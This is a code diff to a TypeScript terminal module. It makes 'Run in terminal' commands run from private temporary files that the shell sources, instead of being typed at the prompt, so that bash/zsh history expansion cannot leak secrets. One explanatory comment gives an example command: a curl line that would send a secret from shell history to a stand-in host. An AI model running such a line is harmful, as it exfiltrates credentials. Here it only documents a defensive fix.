@@ -1,7 +1,7 @@
 import { execFile } from 'node:child_process';
 import { randomUUID } from 'node:crypto';
-import { accessSync } from 'node:fs';
-import { access, constants } from 'node:fs/promises';
+import { accessSync, rmSync } from 'node:fs';
+import { access, constants, mkdtemp, rm, writeFile } from 'node:fs/promises';
 import os from 'node:os';
 import path from 'node:path';
 
@@ -745,12 +745,17 @@ class Term {
     this.tell({ type: 'program', program: name });
   }
 
+  /** Run in terminal's command, in its file of its own (commandFile), taken away as the terminal closes. */
+  runFile?: string;
+
   /**
-   * Run in terminal: types `command`, and Enter, once the shell is ready for it, its first output
-   * (the prompt) gone quiet. A shell that takes pastes (zsh, bash 5.1 and later, fish) gets it as
-   * one, as if pasted: its lines go in together, and run with the Enter after them.
+   * Run in terminal: types `line`, and Enter, once the shell is ready for it, its first output
+   * (the prompt) gone quiet: the line that has the shell read the command from its file
+   * (commandFile), or for a shell that reads none, the command itself, as a paste where the shell
+   * takes pastes (zsh, bash 5.1 and later, fish): its lines go in together, and run with the Enter
+   * after them.
    */
-  typeWhenReady(command: string): void {
+  typeWhenReady(line: string, asPaste = false): void {
     this.used = true;
     let done = false;
     let quiet: NodeJS.Timeout | undefined;
@@ -761,7 +766,7 @@ class Term {
       clearTimeout(quiet);
       clearTimeout(latest);
       if (this.exit || this.closed) return;
-      this.pty.write(this.screen.modes.bracketedPasteMode ? `\x1b[200~${command}\x1b[201~\r` : `${command}\r`);
+      this.pty.write(asPaste && this.screen.modes.bracketedPasteMode ? `\x1b[200~${line}\x1b[201~\r` : `${line}\r`);
       this.lookAtProgramSoon();
     };
     const listening = this.pty.onData(() => {
@@ -791,6 +796,7 @@ class Term {
     clearTimeout(this.gathering);
     clearInterval(this.watching);
     clearTimeout(this.programLook);
+    if (this.runFile) void rm(this.runFile, { force: true }).catch(() => undefined);
     if (this.paused) this.pty.resume();
     if (this.exit) return;
     try {
@@ -868,9 +874,67 @@ export function listTerminals(cwd?: string): TerminalInfo[] {
 }
 
 /**
+ * Run in terminal's commands, each in a file of its own in a folder of this account's alone, which
+ * the shell is told to read (`.`, or `source`) rather than the command typed at its prompt. A line
+ * typed there is one bash, zsh, csh and tcsh expand a `!` in, from the history, before it runs,
+ * also inside double quotes: `echo "!?SECRET?"` printed a secret from the history file, and a
+ * `curl "https://x.example/?d=!?SECRET?"` would have sent it off, though the block read as it runs
+ * once Claude's own tools ran it. A file read in is not expanded so: the command runs as it reads,
+ * in the shell, its folder and its variables, as if typed. A shell that reads no such file (an
+ * unusual one, with no history to expand from `!`) gets the command typed, as before.
+ */
+let runFolder: Promise<string> | undefined;
+let runFolderMade: string | undefined;
+let runCount = 0;
+
+/** A path the shells read as it is, quoted in none of them. */
+const PLAIN_PATH = /^[\w./-]+$/;
+
+/** The folder for the commands' files: in /tmp (a short path to read at the prompt), or else the system's temporary folder. */
+function runFolderNow(): Promise<string> {
+  if (runFolder) return runFolder;
+  const made = (async () => {
+    for (const base of ['/tmp', os.tmpdir()]) {
+      // mkdtemp makes it readable by this account alone (0700), under a name nobody else picks.
+      const dir = await mkdtemp(path.join(base, 'pelican-run-')).catch(() => undefined);
+      if (dir && PLAIN_PATH.test(dir)) return (runFolderMade = dir);
+      if (dir) await rm(dir, { recursive: true, force: true });
+    }
+    throw new Error('Pelican found no folder of its own to run the command from.');
+  })();
+  // A folder that could not be made is tried again next time.
+  made.catch(() => {
+    if (runFolder === made) runFolder = undefined;
+  });
+  runFolder = made;
+  return made;
+}
+
+/** How a shell, by the name a tab gives it, reads a file of commands into itself: `.` in sh's family, `source` in fish's and csh's. */
+function readsFile(shell: string): '.' | 'source' | undefined {
+  if (/^(sh|bash|rbash|zsh|dash|ash|ksh|ksh93|mksh|lksh|oksh|pdksh|yash|posh|osh|pwsh|powershell)$/i.test(shell)) return '.';
+  if (/^(fish|csh|tcsh|nu|xonsh)$/.test(shell)) return 'source';
+  return undefined;
+}
+
+/**
+ * Writes `command` for Run in terminal into a file of its own (readable by this account alone) and
+ * says the line that has `shell` read it in; undefined for a shell that reads no such file.
+ */
+export async function commandFile(command: string, shell: string): Promise<{ file: string; line: string } | undefined> {
+  const reads = readsFile(shell);
+  if (!reads) return undefined;
+  runCount += 1;
+  // PowerShell reads in only a file whose name ends .ps1.
+  const file = path.join(await runFolderNow(), `${runCount}${/^(pwsh|powershell)$/i.test(shell) ? '.ps1' : ''}`);
+  await writeFile(file, `${command}\n`, { mode: 0o600, flag: 'wx' });
+  return { file, line: `${reads} ${file}` };
+}
+
+/**
  * Starts the user's shell, as a login shell, in `cwd` (checked by the caller, with launchFor's
- * `env`), and types `command` into it once it is ready. An ended terminal makes room when as many
- * run as may, else one never used (unused); otherwise TooManyTerminals.
+ * `env`), and has it run `command` once it is ready (commandFile). An ended terminal makes room
+ * when as many run as may, else one never used (unused); otherwise TooManyTerminals.
  */
 export async function openTerminal(cwd: string, size: { cols: number; rows: number }, options: { env?: Record<string, string>; command?: string; colors?: TerminalColors } = {}): Promise<TerminalInfo> {
   const refused = refusal();
@@ -884,10 +948,17 @@ export async function openTerminal(cwd: string, size: { cols: number; rows: numb
     if (!room) throw new TooManyTerminals(`At most ${TERMINAL_LIMITS.terminals} terminals run at once. Close one to open another.`);
     room.close();
   }
+  // The command's file is written before the shell starts: one that cannot be written fails here.
+  const run = options.command ? await commandFile(options.command, programName(file)) : undefined;
   const pty = spawn(file, args, { name: 'xterm-256color', cols: size.cols, rows: size.rows, cwd, env: shellEnvironment(process.env, options.env, file) });
   const term = new Term(cwd, pty, file, size.cols, size.rows, options.colors);
   terminals.set(term.id, term);
-  if (options.command) term.typeWhenReady(options.command);
+  if (run) {
+    term.runFile = run.file;
+    term.typeWhenReady(run.line);
+  } else if (options.command) {
+    term.typeWhenReady(options.command, true);
+  }
   if (!sweeping) {
     sweeping = setInterval(() => void closeIdleTerminals(), terminalTiming.idleCheckMs);
     sweeping.unref();
@@ -959,9 +1030,12 @@ export function closeTerminal(id: string): boolean {
   return Boolean(term);
 }
 
-/** Every terminal ends with Pelican. */
+/** Every terminal ends with Pelican, and Run in terminal's files with them. */
 export function closeAllTerminals(): void {
   for (const term of [...terminals.values()]) term.close(true);
+  if (runFolderMade) rmSync(runFolderMade, { recursive: true, force: true });
+  runFolder = undefined;
+  runFolderMade = undefined;
   clearInterval(sweeping);
   sweeping = undefined;
   clearInterval(checkingSignIns);
